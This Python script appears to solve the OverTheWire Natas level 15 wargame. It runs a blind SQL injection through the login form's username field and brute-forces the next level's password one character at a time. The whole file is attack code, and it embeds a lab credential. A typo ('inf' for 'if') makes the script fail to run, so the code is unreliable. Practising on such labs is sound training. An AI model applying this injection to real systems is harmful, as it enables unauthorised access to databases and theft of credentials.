import requests
from requests.auth import HTTPBasicAuth
import sys

# The target URL
url = "http://natas15.natas.labs.overthewire.org/index.php"

# Authenticate with the current level's credentials
# REPLACE 'YOUR_NATAS15_PASSWORD' with the actual password you found in level 14
auth = HTTPBasicAuth('natas15', 'SdqIqBsFcz3yotlNYErZSZwblkm0lrvx')

# The characters that could possibly be in the password
charset = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'

print("[*] Starting Blind SQL Injection...")
extracted_password = ""

# Natas passwords are exactly 32 characters long
for i in range(32):
    for char in charset:
        # Build the payload: natas16" AND password LIKE BINARY "A%
        # The % is a SQL wildcard matching anything that comes after
        injection = f'natas16" AND password LIKE BINARY "{extracted_password + char}%" #'
        
        # Send the payload via POST request
        data = {'username': injection}
        response = requests.post(url, auth=auth, data=data)
        
        # Check if our injected statement was TRUE
        inf "This user exists." in response.text:
            extracted_password += char
            # Use sys.stdout to print on the same line for a cool hacking effect
            sys.stdout.write(f"\r[*] Password found so far: {extracted_password}")
            sys.stdout.flush()
            break # Move to the next character in the 32-char sequence

print(f"\n[+] BOOM! The password for natas16 is: {extracted_password}")
